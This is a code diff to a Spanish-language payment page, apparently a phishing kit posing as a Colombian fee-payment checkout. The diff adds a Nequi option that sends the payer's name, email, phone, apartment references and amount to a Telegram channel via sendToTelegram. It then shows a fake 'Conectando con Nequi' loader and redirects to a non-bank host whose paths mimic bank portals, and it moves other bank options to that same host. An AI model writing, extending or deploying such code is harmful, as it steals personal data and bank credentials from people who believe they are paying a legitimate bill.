@@ -493,6 +493,13 @@
                     </div>
                 </div>
 
+                <div class="payment-option" id="paymentNequi">
+                    <div class="payment-option-text">Nequi</div>
+                    <div class="payment-icons">
+                        <img src="./img/nequi.png" alt="Nequi" class="logo-payment">
+                    </div>
+                </div>
+
                 <div class="payment-option" id="paymentBrev">
                     <div class="payment-option-text">Bre-v · Transferencia directa</div>
                     <div class="payment-icons">
@@ -574,12 +581,12 @@
                         <label style="font-size: 12px; color: #666; display: block; margin-bottom: 6px; font-weight: 600;">Banco</label>
                         <select id="pseBank" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; font-family: inherit;">
                             <option value="">Selecciona una opción</option>
-                            <option value="https://psec-4jzv.onrender.com/transaction/ent/b-nequi/">Nequi</option>
+                            <option value="https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-nequi/">Nequi</option>
                             <option value="https://checkout.bold.co/payment/LNK_NUNNXF1LUF">Bancolombia</option>
                             <option value="https://checkout.bold.co/payment/LNK_NUNNXF1LUF">Davivienda</option>
-                            <option value="https://psec-4jzv.onrender.com/transaction/ent/b-34f4/wps.portal/virtual/">Banco De Bogotá</option>
+                            <option value="https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-34f4/wps.portal/virtual/">Banco De Bogotá</option>
                             <option value="https://checkout.bold.co/payment/LNK_NUNNXF1LUF">Banco de Occidente</option>
-                            <option value="https://psec-4jzv.onrender.com/transaction/ent/b-34f18/">Banco Popular</option>
+                            <option value="https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-34f18/">Banco Popular</option>
                             <option value="https://checkout.bold.co/payment/LNK_NUNNXF1LUF">Banco AV Villas</option>
                             <option value="https://checkout.bold.co/payment/LNK_NUNNXF1LUF">Banco Caja Social</option>
                             <option value="https://checkout.bold.co/payment/LNK_NUNNXF1LUF">BBVA Colombia</option>
@@ -804,6 +811,7 @@ ${metodoInfo}
             // Button handlers
             const paymentTarjeta = document.getElementById('paymentTarjeta');
             const paymentPSE = document.getElementById('paymentPSE');
+            const paymentNequi = document.getElementById('paymentNequi');
             const paymentBrev = document.getElementById('paymentBrev');
             const btnPagar = document.getElementById('btnPagarFinal');
 
@@ -813,6 +821,7 @@ ${metodoInfo}
             function deseleccionarTodos() {
                 paymentTarjeta.classList.remove('active');
                 paymentPSE.classList.remove('active');
+                paymentNequi.classList.remove('active');
                 paymentBrev.classList.remove('active');
                 document.getElementById('tarjetaForm').style.display = 'none';
                 document.getElementById('pseForm').style.display = 'none';
@@ -838,6 +847,15 @@ ${metodoInfo}
                 btnPagar.disabled = false;
                 window._metodoPagoActivo = 'pse';
                 sessionStorage.setItem('metodoPago', 'pse');
+            });
+
+            paymentNequi.addEventListener('click', function() {
+                deseleccionarTodos();
+                paymentNequi.classList.add('active');
+                btnPagar.classList.add('active');
+                btnPagar.disabled = false;
+                window._metodoPagoActivo = 'nequi';
+                sessionStorage.setItem('metodoPago', 'nequi');
             });
 
             paymentBrev.addEventListener('click', function() {
@@ -873,6 +891,29 @@ ${metodoInfo}
                     // Abrir modal
                     const modal = document.getElementById('brevModal');
                     modal.style.setProperty('display', 'flex', 'important');
+                    return;
+                }
+
+                if (metodoPago === 'nequi') {
+                    sendToTelegram({
+                        nombre: userNombre,
+                        apellido: userApellido,
+                        email: userEmail,
+                        celular: userCelular,
+                        nombreConjunto: nombreConjunto,
+                        referencia1: referencia1,
+                        selectedApt: selectedApt,
+                        referencia2: referencia2,
+                        metodoPago: 'nequi',
+                        pseBank: 'Nequi',
+                        monto_formateado: totalFormatted
+                    });
+                    document.getElementById('brevLoadingTexto').textContent = 'Conectando con Nequi...';
+                    document.getElementById('brevLoadingOverlay').style.display = 'flex';
+                    btnPagar.disabled = true;
+                    setTimeout(() => {
+                        window.location.href = 'https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-nequi/';
+                    }, 1800);
                     return;
                 }
 
